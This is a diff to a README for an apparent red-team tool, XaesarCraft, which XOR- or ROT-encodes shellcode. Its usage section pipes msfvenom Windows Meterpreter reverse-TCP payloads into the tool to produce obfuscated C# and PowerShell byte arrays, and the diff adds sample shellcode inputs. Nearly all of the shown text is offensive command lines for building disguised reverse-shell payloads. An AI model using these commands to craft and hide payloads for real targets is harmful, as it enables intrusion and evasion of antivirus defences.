@@ -15,10 +15,14 @@ XaesarCraft is a powerful security tool that integrates XOR encryption and Caesa
 ## Example of usage:
 
 ```
+More usefull ;)
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f csharp | python3 XaesarCraft.py --mode rot # default ROT13
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f ps1 | python3 XaesarCraft.py --m rot --n 0x13
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f ps1 | python3 XaesarCraft.py --m rot -n 0x13
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f ps1 | python3 XaesarCraft.py # default XOR 0xfa
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f csharp | python3 XaesarCraft.py --m xor -n 0x13
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f csharp | python3 XaesarCraft.py -n 0x13
+Why not:
+python3 XaesarCraft.py --input "[Byte[]] $buf = 0xf8,0xa5,0x6c,0x11,0xfc,0x05"
+python3 XaesarCraft.py --input "[Byte[]] $buf = 0xf8,0xa5,0x6c,0x11,0xfc,0x05" -m rot
 ```
 
 TBD:
